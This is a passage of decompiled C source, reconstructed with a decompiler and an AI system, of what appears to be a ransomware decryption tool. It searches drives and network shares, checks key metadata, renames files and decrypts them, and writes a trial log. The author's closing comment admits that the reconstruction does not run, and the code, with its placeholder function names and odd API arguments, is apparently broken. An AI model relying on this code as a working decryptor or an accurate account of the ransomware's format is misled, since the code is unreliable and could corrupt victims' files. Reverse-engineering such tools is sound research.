        if (*((int*)*a4 + 151) == magic) {
            void* nextMeta = NULL;
            metaLen = sub_403584(lpExistingFileName, &nextMeta);
            if (metaLen == 0)
                goto cleanup;
            memcpy((uint8_t*)nextMeta + 608, (uint8_t*)*a4 + 608, 0x80u);
            sub_401FE4(*a4);
            *a4 = nextMeta;
            goto rename_and_queue;
        }
        sub_401FE4(*a4);
        *a4 = NULL;
    }

    metaLen = sub_403584(lpExistingFileName, a4);
    if (*a4 == NULL)
        goto cleanup;

    uint32_t* keyCtx = (uint32_t*)dword_407704;
    uint32_t* work = (uint32_t*)((uint8_t*)*a4 + 608);
    sub_4015C4(work, (const uint8_t*)dword_407704, keyCtx + 32);
    uint64_t checkOff = 120ULL * (uint32_t)(134775813u * work[31] + 1u);
    if (*(uint32_t*)((uint8_t*)work + (uint32_t)(checkOff >> 32)) != keyCtx[32]) {
        if (*a4 != NULL) {
            sub_401FE4(*a4);
            *a4 = NULL;
        }
        sub_402230(hFile, 3, lpExistingFileName, NULL);
        goto cleanup;
    }

rename_and_queue:
    lpNewFileName = sub_40378C(lpExistingFileName, (uint16_t*)*a4);
    if (lpNewFileName != NULL) {
        while (!MoveFileExW(lpExistingFileName, lpNewFileName, MOVEFILE_REPLACE_EXISTING)) {
            if (read_teb_last_error() == ERROR_ALREADY_EXISTS) {
                lpNewFileName = (wchar_t*)sub_40369C(lpNewFileName);
                if (lpNewFileName != NULL)
                    continue;
            }
            goto cleanup;
        }

        HANDLE hTarget = CreateFileW(
            lpNewFileName, GENERIC_READ | GENERIC_WRITE, 0, NULL,
            OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_FLAG_NO_BUFFERING, NULL);
        if (hTarget != INVALID_HANDLE_VALUE) {
            DEC_WORK_CTX* workCtx = (DEC_WORK_CTX*)sub_403890(
                (int)(uintptr_t)lpExistingFileName, (const uint8_t*)*a4, a3);
            if (workCtx != NULL) {
                if (CreateIoCompletionPort(hTarget, CompletionPort, 0, 0) != NULL) {
                    *(DWORD*)(workCtx->pad_3c + 4) = metaLen;
                    workCtx->hFile = hTarget;
                    workCtx->stage = 0;
                    if (PostQueuedCompletionStatus(CompletionPort, 0, 0, &workCtx->ov)) {
                        sub_402230(hFile, 0, lpExistingFileName, lpNewFileName);
                        InterlockedIncrement(&dword_407F18);
                        status = 1;
                    } else {
                        RtlDestroyHeap(workCtx->hHeap);
                        NtClose(hTarget);
                    }
                } else {
                    sub_401FE4(workCtx);
                    NtClose(hTarget);
                }
            } else {
                NtClose(hTarget);
            }
        }
    }

cleanup:
    if (lpNewFileName != NULL)
        sub_401FE4(lpNewFileName);
    if (lpExistingFileName != NULL)
        sub_401FE4(lpExistingFileName);
    return status;
}

wchar_t* __stdcall sub_403BD4(const wchar_t* String) {
    size_t len = wcslen(String);
    if (len == 0)
        return NULL;
    wchar_t* out = (wchar_t*)sub_401FA8(2u * len + 8u);
    if (out != NULL) {
        wcscpy(out, String);
        wchar_t* end = &out[len];
        if (*(end - 1) == L'\\')
            --end;
        *(uint32_t*)end = 2752604u;
    }
    return out;
}

wchar_t* __stdcall sub_403C3C(const wchar_t* String, const wchar_t* Source) {
    size_t l1 = wcslen(String);
    size_t l2 = wcslen(Source);
    wchar_t* out = (wchar_t*)sub_401FA8(2u * (l1 + l2) + 2u);
    if (out != NULL) {
        wcscpy(out, String);
        wcscat(out, Source);
    }
    return out;
}

int __stdcall sub_403C90(const uint16_t* a1) {
    if (dword_407708 != 0) {
        int h = sub_40103C(a1, 0);
        const int* list = (const int*)(uintptr_t)dword_407708;
        for (;;) {
            int entry = *list++;
            if (entry == 0)
                break;
            if (h == entry || h == -482186025)
                return 1;
        }
    }
    return 0;
}

DWORD __stdcall sub_403CEC(LPVOID lpParameter) {
    WCHAR* target = (WCHAR*)lpParameter;
    PVOID metaCache = NULL;

    if ((GetFileAttributesW(target) & FILE_ATTRIBUTE_DIRECTORY) != 0) {
        SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
        FINDEX_INFO_LEVELS infoLevel = (sub_401478() <= 0x3C) ? FindExInfoStandard : (FINDEX_INFO_LEVELS)2;
        void** dirStack = (void**)sub_401FA8(0x3D0900u);
        void* curDir = target;
        int top = -1;

        for (;;) {
            LPWSTR searchPat = sub_403BD4((const wchar_t*)curDir);
            sub_401FE4(curDir);

            WIN32_FIND_DATAW ffd;
            HANDLE hFind = FindFirstFileExW(
                searchPat, FindExInfoStandard, &ffd, FindExSearchNameMatch, NULL, (DWORD)infoLevel);
            if (hFind != INVALID_HANDLE_VALUE) {
                *wcsrchr(searchPat, L'*') = 0;
                do {
                    uint32_t firstDword = *(const uint32_t*)ffd.cFileName;
                    if (firstDword != 46u && firstDword != 3014702u &&
                        (ffd.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM) == 0) {
                        if ((ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0) {
                            if (sub_403C90((const uint16_t*)ffd.cFileName) == 0) {
                                wchar_t* sub = sub_403C3C(searchPat, ffd.cFileName);
                                ++top;
                                dirStack[top] = sub;
                            }
                        } else if (ffd.nFileSizeHigh != 0 || ffd.nFileSizeLow != 0) {
                            wchar_t* full = sub_403C3C(searchPat, ffd.cFileName);
                            uint64_t fsz = ((uint64_t)ffd.nFileSizeHigh << 32) | ffd.nFileSizeLow;
                            if (dword_407F4C != 0) {
                                sub_403960(full, fsz, &metaCache);
                            } else {
                                if (dword_407F50 != 0)
                                    sub_402800(full, ffd.nFileSizeLow, ffd.nFileSizeHigh);
                                else if (sub_4034CC(full) != 0)
                                    InterlockedIncrement(&uValue);
                                sub_401FE4(full);
                            }
                        } else if (hFile != INVALID_HANDLE_VALUE) {
                            wchar_t* emptyPath = sub_403C3C(searchPat, ffd.cFileName);
                            sub_402230(hFile, 0, emptyPath, NULL);
                            sub_401FE4(emptyPath);
                        }
                    }
                } while (FindNextFileW(hFind, &ffd));
                FindClose(hFind);
            }

            sub_401FE4(searchPat);
            if (top == -1)
                break;
            curDir = dirStack[top];
            dirStack[top] = NULL;
            --top;
        }

        sub_401FE4(dirStack);
        if (metaCache != NULL)
            sub_401FE4(metaCache);
    } else {
        LARGE_INTEGER fsz;
        BOOL exists = sub_402E48(target, &fsz);
        if (exists && fsz.QuadPart != 0) {
            if (dword_407F4C != 0) {
                sub_403960(target, (uint64_t)fsz.QuadPart, &metaCache);
                if (metaCache != NULL)
                    sub_401FE4(metaCache);
            } else if (sub_402800(target, fsz.LowPart, (DWORD)fsz.HighPart) == 0) {
                if (sub_4034CC(target) != 0)
                    InterlockedIncrement(&uValue);
                sub_401FE4(target);
            }
        } else {
            sub_402230(hFile, 0, target, NULL);
        }
    }
    return 0;
}

DWORD __stdcall sub_403F98(LPVOID lpParam) {
    (void)lpParam;
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
    sub_402E94();
    if (dword_407F4C != 0) {
        sub_4028F0();
        dword_407F4C = 0;
        dword_407F50 = 1;
        sub_402E94();
    }
    return 0;
}

int sub_403FD0(void) {
    SetConsoleTitleW(ConsoleTitle);
    HANDLE hIn = GetStdHandle(STD_INPUT_HANDLE);
    HWND hWnd = GetConsoleWindow();
    SetWindowPos(hWnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE);

    dword_407F4C = 0;
    dword_407F50 = 0;
    uValue = 0;

    wchar_t lineBuf[268];
    hHandle = CreateThread(NULL, 0, sub_403F98, NULL, CREATE_SUSPENDED, NULL);
    if (hHandle != NULL) {
        sub_401398(aFindingFilesIn, 10);
        sub_401398(aWait, 15);
        ResumeThread(hHandle);
        while (WaitForSingleObject(hHandle, 10) == WAIT_TIMEOUT) {
            _snwprintf(lineBuf, _countof(lineBuf) - 1, aFoundUFileS_0, (unsigned int)uValue);
            sub_401398(lineBuf, 15);
            FlushConsoleInputBuffer(hIn);
        }
        CloseHandle(hHandle);
        _snwprintf(lineBuf, _countof(lineBuf) - 1, aFoundUFileS, (unsigned int)uValue);
        sub_401398(lineBuf, 15);
        FlushConsoleInputBuffer(hIn);

        if (uValue != 0) {
            dword_407F4C = 1;
            dword_407F50 = 0;
            dword_407F60 = 0;
            hHandle = CreateThread(NULL, 0, sub_403F98, NULL, CREATE_SUSPENDED, NULL);
            if (hHandle != NULL) {
                sub_401398(aDecryptingFile, 10);
                sub_401398(aWait_0, 15);
                ResumeThread(hHandle);
                while (WaitForSingleObject(hHandle, 10) == WAIT_TIMEOUT) {
                    _snwprintf(lineBuf, _countof(lineBuf) - 1, aDecryptedUFile_0, (unsigned int)dword_407F60);
                    sub_401398(lineBuf, 15);
                    FlushConsoleInputBuffer(hIn);
                }
                CloseHandle(hHandle);
                _snwprintf(lineBuf, _countof(lineBuf) - 1, aDecryptedUFile, (unsigned int)dword_407F60);
                sub_401398(lineBuf, 15);
                FlushConsoleInputBuffer(hIn);
                sub_401398(aDecryptingFini, 10);
            }
        }
    }

    sub_401398(aPressAnyKeyToE, 15);
    return sub_4013EC();
}

DWORD __stdcall sub_40421C(LPVOID lpParameter) {
    wchar_t* param = (wchar_t*)lpParameter;
    wchar_t* parentDir = NULL;
    wchar_t* workParam = NULL;

    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
    if (dword_407F4C != 0) {
        workParam = param;
        parentDir = sub_40206C(param, 0);
        if (parentDir != NULL && (GetFileAttributesW(parentDir) & FILE_ATTRIBUTE_DIRECTORY) == 0)
            PathRemoveFileSpecW(parentDir);
    } else {
        workParam = sub_40206C(param, 0);
    }

    sub_403CEC(workParam);
    if (dword_407F4C != 0) {
        for (;;) {
            LONG snap = dword_407F18;
            if (snap == InterlockedCompareExchange(&Addend, snap, snap))
                break;
            Sleep(100);
        }
        dword_407F4C = 0;
        dword_407F50 = 1;
        return sub_403CEC(parentDir);
    }
    return 0;
}

char __stdcall sub_4042C0(const wchar_t* String, const wchar_t* lpFileName) {
    wchar_t* targetCopy = sub_40206C(String, 0);
    if (targetCopy == NULL)
        return 0;

    LPWSTR logPath = NULL;
    if (lpFileName != NULL) {
        if (PathFileExistsW(lpFileName) && (GetFileAttributesW(lpFileName) & FILE_ATTRIBUTE_DIRECTORY) != 0) {
            logPath = sub_40206C(lpFileName, 16);
            sub_401564(logPath);
            wcscat(logPath, L"trial_dec.log");
        } else {
            logPath = sub_40206C(lpFileName, 0);
        }
    } else {
        PWSTR imgPath = sub_401554();
        size_t len = wcslen(imgPath);
        logPath = sub_40206C(imgPath, (int)len + 14);
        PathRemoveFileSpecW(logPath);
        sub_401564(logPath);
        wcscat(logPath, L"trial_dec.log");
    }

    if (logPath != NULL)
        hFile = CreateFileW(logPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (PathFileExistsW(targetCopy)) {
        dword_407F4C = 1;
        dword_407F50 = 0;
        HANDLE hT = CreateThread(NULL, 0, sub_403CEC, targetCopy, 0, NULL);
        if (hT != NULL) {
            WaitForSingleObject(hT, INFINITE);
            NtClose(hT);
            for (;;) {
                LONG snap = dword_407F18;
                if (snap == InterlockedCompareExchange(&Addend, snap, snap))
                    break;
                Sleep(100);
            }
        }
    } else {
        if (read_teb_last_error() == ERROR_FILE_NOT_FOUND)
            sub_402230(hFile, 1, String, NULL);
        sub_401FE4(targetCopy);
    }

    if (logPath != NULL)
        sub_401FE4(logPath);
    if (hFile != INVALID_HANDLE_VALUE && hFile != NULL)
        NtClose(hFile);
    return 1;
}

INT_PTR __stdcall DialogFunc(HWND hWnd, UINT a2, WPARAM wParam, LPARAM lParam) {
    (void)lParam;
    switch (a2) {
        case WM_INITDIALOG: {
            HMODULE hInst = GetModuleHandleW(NULL);
            HICON hIcon = LoadIconW(hInst, (LPCWSTR)0x64);
            SendMessageW(hWnd, WM_SETICON, ICON_BIG, (LPARAM)hIcon);
            SetWindowTextW(hWnd, String);
            SetWindowTextW(GetDlgItem(hWnd, 1001), aDecryptAllEncr);

            if (sub_401478() >= 0x3C) {
                HMODULE hUser32 = GetModuleHandleW(aUser32);
                pfnChangeWindowMessageFilter = (BOOL (__stdcall *)(UINT, DWORD))
                    GetProcAddress(hUser32, aChangewindowme);
                if (pfnChangeWindowMessageFilter != NULL) {
                    pfnChangeWindowMessageFilter(WM_DROPFILES, 1);
                    pfnChangeWindowMessageFilter(WM_COPYDATA, 1);
                    pfnChangeWindowMessageFilter(WM_COPYGLOBALDATA, 1);
                }
            }
            SetDlgItemInt(hWnd, 1002, 0, FALSE);
            SetDlgItemInt(hWnd, 1003, 0, FALSE);
            pszPath = (LPCWSTR)(intptr_t)-1;
            break;
        }
        case WM_DROPFILES: {
            HDROP hDrop = (HDROP)wParam;
            hHandle = NULL;
            P = NULL;
            pszPath = NULL;
            dword_407F48 = NULL;
            dword_407F54 = 0;
            SetDlgItemInt(hWnd, 1002, 0, FALSE);
            SetDlgItemInt(hWnd, 1003, 0, FALSE);

            UINT cch = DragQueryFileW(hDrop, 0, NULL, 0) + 1u;
            P = (LPWSTR)sub_401FA8(2u * cch);
            if (P != NULL) {
                DragQueryFileW(hDrop, 0, P, cch);
                while (PathIsNetworkPathW(P)) {
                    if (read_teb_last_error() != 1201u) {
                        pszPath = (LPCWSTR)sub_402124(P);
                        if (pszPath == NULL)
                            goto drop_cleanup;
                        goto check_target;
                    }
                    if (ExistingTokenHandle == NULL)
                        goto net_err;
                    Size = 4;
                    sub_402C28(ExistingTokenHandle, P, 1, &dword_407F48, &Size);
                    dword_407F48 = sub_401FA8(Size);
                    if (dword_407F48 == NULL)
                        goto drop_cleanup;
                    if (sub_402C28(ExistingTokenHandle, P, 1, dword_407F48, &Size) != 0)
                        goto net_err;

                    wchar_t* remote = *(wchar_t**)dword_407F48;
                    sub_401594(remote);
                    sub_401FE4(P);
                    P = sub_40206C(remote, 0);
                    if (P == NULL)
                        goto drop_cleanup;
                    if (!PathIsDirectoryW(remote))
                        PathRemoveFileSpecW(remote);

                    memset(&NetResource, 0, sizeof(NetResource));
                    NetResource.lpRemoteName = remote;
                    if (WNetAddConnection2W(&NetResource, NULL, NULL, 8u) != 0) {
                        sub_401FE4(dword_407F48);
                        dword_407F48 = NULL;
                    net_err:
                        MessageBoxW(hWnd, Text, Caption, MB_ICONERROR | MB_TASKMODAL);
                        goto drop_cleanup;
                    }
                    sub_401FE4(dword_407F48);
                    dword_407F48 = NULL;
                }

                pszPath = (LPCWSTR)sub_4020C4(P);
                if (pszPath == NULL)
                    goto drop_cleanup;

            check_target: {
                    DWORD attr = GetFileAttributesW(pszPath);
                    if (attr == INVALID_FILE_ATTRIBUTES ||
                        ((attr & FILE_ATTRIBUTE_DIRECTORY) != 0 && PathIsDirectoryEmptyW(pszPath))) {
                        sub_401FE4((PVOID)pszPath);
                        pszPath = NULL;
                    } else {
                        dword_407F4C = 0;
                        dword_407F50 = 0;
                        uValue = 0;
                        hHandle = CreateThread(NULL, 0, sub_40421C, (LPVOID)pszPath, CREATE_SUSPENDED, NULL);
                        if (hHandle != NULL) {
                            SetTimer(hWnd, 0x4AAE4FC3u, 0x32u, NULL);
                            ResumeThread(hHandle);
                            SetWindowTextW(GetDlgItem(hWnd, 1001), aFindingFilesIn_0);
                            EnableWindow(GetDlgItem(hWnd, 1001), FALSE);
                        }
                    }
                }
            }
        drop_cleanup:
            if (dword_407F48 != NULL) {
                sub_401FE4(dword_407F48);
                dword_407F48 = NULL;
            }
            if (P != NULL) {
                sub_401FE4(P);
                P = NULL;
            }
            break;
        }
        case WM_CLOSE:
            EndDialog(hWnd, 0);
            break;
        case WM_TIMER: {
            UINT_PTR timerId = wParam;
            if (timerId == 0x4AAE4FC3u) {
                if (WaitForSingleObject(hHandle, 1) != WAIT_TIMEOUT) {
                    NtClose(hHandle);
                    hHandle = NULL;
                    KillTimer(hWnd, 0x4AAE4FC3u);
                    if (uValue != 0) {
                        LPTHREAD_START_ROUTINE fn = (dword_407F54 != 0) ? sub_403F98 : sub_40421C;
                        LPVOID arg = (dword_407F54 != 0) ? NULL : (LPVOID)pszPath;
                        dword_407F4C = 1;
                        dword_407F50 = 0;
                        dword_407F60 = 0;
                        hHandle = CreateThread(NULL, 0, fn, arg, CREATE_SUSPENDED, NULL);
                        if (hHandle != NULL) {
                            SetTimer(hWnd, 0x9FAE0121u, 0x32u, NULL);
                            ResumeThread(hHandle);
                            EnableWindow(GetDlgItem(hWnd, 1001), FALSE);
                            SetWindowTextW(GetDlgItem(hWnd, 1001),
                                           (uValue == 1) ? aDecryptingFile_0 : aDecryptingFile_1);
                        }
                    } else {
                        SetWindowTextW(GetDlgItem(hWnd, 1001), aDecryptAllEncr_0);
                        EnableWindow(GetDlgItem(hWnd, 1001), TRUE);
                        if (pszPath != NULL)
                            sub_401FE4((PVOID)pszPath);
                    }
                }
                SetDlgItemInt(hWnd, 1002, (UINT)uValue, FALSE);
            } else if (timerId == 0x9FAE0121u) {
                if (WaitForSingleObject(hHandle, 0) != WAIT_TIMEOUT) {
                    NtClose(hHandle);
                    hHandle = NULL;
                    KillTimer(hWnd, 0x9FAE0121u);
                    SetWindowTextW(GetDlgItem(hWnd, 1001), aDecryptAllEncr_1);
                    EnableWindow(GetDlgItem(hWnd, 1001), TRUE);
                    pszPath = (LPCWSTR)(intptr_t)-1;
                }
                SetDlgItemInt(hWnd, 1003, (UINT)dword_407F60, FALSE);
            }
            break;
        }
        case WM_COMMAND:
            if (LOWORD(wParam) == 1001) {
                dword_407F4C = 0;
                dword_407F50 = 0;
                uValue = 0;
                dword_407F54 = 1;
                SetDlgItemInt(hWnd, 1002, 0, FALSE);
                SetDlgItemInt(hWnd, 1003, 0, FALSE);
                hHandle = CreateThread(NULL, 0, sub_403F98, NULL, CREATE_SUSPENDED, NULL);
                if (hHandle != NULL) {
                    SetTimer(hWnd, 0x4AAE4FC3u, 0x32u, NULL);
                    ResumeThread(hHandle);
                    EnableWindow(GetDlgItem(hWnd, 1001), FALSE);
                    SetWindowTextW(GetDlgItem(hWnd, 1001), aFindingFilesIn_1);
                }
            }
            break;
        default:
            break;
    }
    return 0;
}

INT_PTR sub_404C0C(void) {
    HMODULE hInst = GetModuleHandleW(NULL);
    return DialogBoxParamW(hInst, (LPCWSTR)0x3E8, NULL, DialogFunc, 0);
}

unsigned int sub_404C30(void) {
    unsigned int ver = (unsigned int)sub_401478();
    if (ver > 0x3C) {
        ULONG heapInfo = 2u;
        return (unsigned int)HeapSetInformation(
            get_peb_x86()->ProcessHeap, HeapCompatibilityInformation, &heapInfo, sizeof(heapInfo));
    }
    return ver;
}

void sub_404EBC(const uint8_t* a2, uint8_t* a3) {
    uint8_t bits = 0x80;
    uint8_t lastOffByte = 0;
    int mode = 2;

    for (;;) {
        *a3++ = *a2++;
        mode = 2;
        for (;;) {
            bool b0 = (bits & 0x80u) != 0;
            bits <<= 1;
            if (bits == 0) {
                bits = *a2++;
                b0 = (bits & 0x80u) != 0;
                bits = (uint8_t)((bits << 1) | 1u);
            }
            if (!b0)
                break;

            bool b1 = (bits & 0x80u) != 0;
            bits <<= 1;
            if (bits == 0) {
                bits = *a2++;
                b1 = (bits & 0x80u) != 0;
                bits = (uint8_t)((bits << 1) | 1u);
            }
            if (b1) {
                bool b2 = (bits & 0x80u) != 0;
                bits <<= 1;
                if (bits == 0) {
                    bits = *a2++;
                    b2 = (bits & 0x80u) != 0;
                    bits = (uint8_t)((bits << 1) | 1u);
                }
                if (!b2) {
                    uint8_t code = *a2++;
                    uint32_t dist = code >> 1;
                    if (dist == 0)
                        return;
                    uint32_t matchLen = (code & 1u) + 2u;
                    lastOffByte = (uint8_t)dist;
                    for (uint32_t k = 0; k < matchLen; ++k) {
                        *a3 = a3[-(int)dist];
                        ++a3;
                    }
                } else {
                    uint32_t off4 = 0;
                    for (int n = 0; n < 4; ++n) {
                        bool bitVal = (bits & 0x80u) != 0;
                        bits <<= 1;
                        if (bits == 0) {
                            bits = *a2++;
                            bitVal = (bits & 0x80u) != 0;
                            bits = (uint8_t)((bits << 1) | 1u);
                        }
                        off4 = (off4 << 1) | (bitVal ? 1u : 0u);
                    }
                    uint8_t val = (off4 != 0) ? *(a3 - (int)off4) : 0;
                    *a3++ = val;
                }
                mode = 1;
            } else {
                uint32_t gamma = 1;
                for (;;) {
                    bool gb0 = (bits & 0x80u) != 0;
                    bits <<= 1;
                    if (bits == 0) {
                        bits = *a2++;
                        gb0 = (bits & 0x80u) != 0;
                        bits = (uint8_t)((bits << 1) | 1u);
                    }
                    gamma = (gamma << 1) | (gb0 ? 1u : 0u);

                    bool gb1 = (bits & 0x80u) != 0;
                    bits <<= 1;
                    if (bits == 0) {
                        bits = *a2++;
                        gb1 = (bits & 0x80u) != 0;
                        bits = (uint8_t)((bits << 1) | 1u);
                    }
                    if (!gb1)
                        break;
                }

                int delta = (int)gamma - mode;
                mode = 1;
                if (delta != 0) {
                    uint32_t dist = ((uint32_t)(delta - 1) << 8) | (uint8_t)(*a2++);
                    lastOffByte = (uint8_t)(dist & 0xFFu);

                    uint32_t lenGamma = 1;
                    for (;;) {
                        bool lb0 = (bits & 0x80u) != 0;
                        bits <<= 1;
                        if (bits == 0) {
                            bits = *a2++;
                            lb0 = (bits & 0x80u) != 0;
                            bits = (uint8_t)((bits << 1) | 1u);
                        }
                        lenGamma = (lenGamma << 1) | (lb0 ? 1u : 0u);

                        bool lb1 = (bits & 0x80u) != 0;
                        bits <<= 1;
                        if (bits == 0) {
                            bits = *a2++;
                            lb1 = (bits & 0x80u) != 0;
                            bits = (uint8_t)((bits << 1) | 1u);
                        }
                        if (!lb1)
                            break;
                    }

                    uint32_t matchLen = lenGamma +
                        ((dist < 0x80u) ? 2u : 0u) -
                        ((dist < 0x7D00u) ? 1u : 0u) -
                        ((dist < 0x500u) ? 1u : 0u);
                    for (uint32_t k = 0; k < matchLen; ++k) {
                        *a3 = a3[-(int)dist];
                        ++a3;
                    }
                } else {
                    uint32_t lenGamma = 1;
                    for (;;) {
                        bool lb0 = (bits & 0x80u) != 0;
                        bits <<= 1;
                        if (bits == 0) {
                            bits = *a2++;
                            lb0 = (bits & 0x80u) != 0;
                            bits = (uint8_t)((bits << 1) | 1u);
                        }
                        lenGamma = (lenGamma << 1) | (lb0 ? 1u : 0u);

                        bool lb1 = (bits & 0x80u) != 0;
                        bits <<= 1;
                        if (bits == 0) {
                            bits = *a2++;
                            lb1 = (bits & 0x80u) != 0;
                            bits = (uint8_t)((bits << 1) | 1u);
                        }
                        if (!lb1)
                            break;
                    }

                    uint32_t dist = (uint32_t)lastOffByte;
                    for (uint32_t k = 0; k < lenGamma; ++k) {
                        *a3 = a3[-(int)dist];
                        ++a3;
                    }
                }
            }
        }
    }
}

int main(void) {
    bool autoMode = false;
    bool pathMode = false;
    const wchar_t* targetPath = NULL;
    const wchar_t* logArg = NULL;
    EXECUTION_STATE prevExecState = 0;

    typedef NTSTATUS (WINAPI *PFN_NtSetThreadExecutionState)(EXECUTION_STATE, EXECUTION_STATE*);
    PFN_NtSetThreadExecutionState pfnSetExec = NULL;

    hFile = INVALID_HANDLE_VALUE;
    if (sub_4012D0() == 0)
        sub_404C30();

    if (!sub_4022E0()) {
        sub_4024FC();
        if (sub_4012D0() == 0)
            sub_402B3C();

        HMODULE hNtdll = GetModuleHandleW(aNtdllDll_0);
        pfnSetExec = (PFN_NtSetThreadExecutionState)GetProcAddress(hNtdll, aNtsetthreadexe);
        if (pfnSetExec != NULL)
            pfnSetExec(ES_CONTINUOUS | ES_SYSTEM_REQUIRED, &prevExecState);

        sub_402770();
        ExistingTokenHandle = sub_40233C();

        int argc = 0;
        LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
        if (argv != NULL) {
            for (int i = 1; i < argc; ) {
                if (_wcsicmp(argv[i], L"-auto") == 0) { /* INTERESTING ARGUMENTS */
                    autoMode = true;
                    ++i;
                } else if (_wcsicmp(argv[i], L"-path") == 0) { /* INTERESTING ARGUMENTS */
                    if (i + 1 >= argc)
                        break;
                    targetPath = argv[i + 1];
                    pathMode = true;
                    i += 2;
                } else if (_wcsicmp(argv[i], L"-log") == 0) { /* INTERESTING ARGUMENTS */
                    if (i + 1 >= argc)
                        break;
                    logArg = argv[i + 1];
                    i += 2;
                } else {
                    ++i;
                }
            }

            if (autoMode) {
                int workers = sub_4033B0();
                if (workers != 0) {
                    sub_403FD0();
                    sub_403430(workers);
                }
            } else if (pathMode) {
                int workers = sub_4033B0();
                if (workers != 0) {
                    sub_4042C0(targetPath, logArg);
                    sub_403430(workers);
                }
            } else {
                int workers = sub_4033B0();
                sub_404C0C();
                if (workers != 0)
                    sub_403430(workers);
            }

            LocalFree(argv);
        }

        if (pfnSetExec != NULL)
            pfnSetExec(prevExecState, &prevExecState);
    }

    ExitProcess(0);
    return 0;
}

/*
This Doesnt run for some reason, but it was fun to do.

Project for Educational purposes only.
Thanks To DogBolt.org and Gemini for Code Reconstruction.

2026-11-19
LB™
*/
